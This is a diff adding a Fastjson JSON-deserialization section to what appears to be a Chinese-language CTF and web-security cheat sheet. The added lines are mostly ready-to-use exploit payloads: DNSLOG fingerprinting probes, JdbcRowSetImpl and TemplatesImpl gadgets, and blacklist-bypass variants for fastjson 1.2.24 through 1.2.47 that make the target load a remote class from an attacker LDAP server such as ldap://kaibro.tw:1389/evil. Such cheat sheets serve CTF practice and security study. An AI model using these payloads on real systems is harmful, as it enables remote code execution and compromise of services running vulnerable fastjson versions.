@@ -3004,6 +3004,45 @@ print marshalled
         - rmi / ldap 被黑名單阻擋時
             - 可嘗試 `ldaps`
             - ref: https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html
+- JSON Deserialization
+    - Fastjson
+        - 反序列化方法
+            - `parse()`
+            - `parseObject()`
+            - `parseArray()`
+        - Fingerprinting
+            - DNSLOG: 
+                - `{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}`
+                - `{{"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}`
+        - fastjson 1.2.24
+            - fastjson <= 1.2.24
+            - JdbcRowSetImpl gadget (JNDI): `{"@type" : "com.sun.rowset.JdbcRowSetImpl","dataSourceName" : "ldap://kaibro.tw:1389/evil","autoCommit" : true}`
+            - TemplatesImpl gadget: `{"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes": ["yv66vgA...JAAk="],"_name": "kaibro","_tfactory": {},"_outputProperties": {},}`
+        - fastjson 1.2.25
+            - 1.2.25 <= fastjson <= 1.2.41
+            - 黑名單繞過 (`L` & `;`)
+            - 需開啟 AutoType (預設關閉)
+            - `{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://127.0.0.1:23457/Exploit","autoCommit":true}`
+        - fastjson 1.2.42
+            - 黑名單繞過 (`L` & `;` 兩次)
+            - `{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://127.0.0.1:23457/Exploit","autoCommit":true}`
+        - fastjson 1.2.43
+            - 1.2.25 <= fastjson <= 1.2.43
+            - 黑名單繞過 (`[`)
+            - `{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,{"dataSourceName":"ldap://127.0.0.1:23457/Exploit","autoCommit":true}`
+        - fastjson 1.2.45
+            - 1.2.25 <= fastjson <= 1.2.45
+            - 黑名單繞過 (JndiDataSourceFactory)
+            - `{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://127.0.0.1:23457/Exploit"}}`
+        - fastjson 1.2.47
+            - 1.2.25-1.2.32 未開啟 AutoTypeSupport 時能利用 (開啟時不行)
+            - 1.2.33-1.2.47 無論是否開啟 AutoTypeSupport 都能利用
+            - `{"a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "b": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://localhost:1389/Exploit", "autoCommit": true}}`
+        - more
+            - https://github.com/safe6Sec/Fastjson
+        - Example
+            - [Aliyun CTF 2023 - ezbean](https://nese.team/writeup/aliyunctf2023.pdf)
+            - [N1CTF 2022 - Old FastJSON](https://nese.team/writeup/n1ctf2022.pdf)
 - Tool
     - [yososerial](https://github.com/frohoff/ysoserial)
         - URLDNS: 不依賴任何額外library，可以用來做 dnslog 驗證
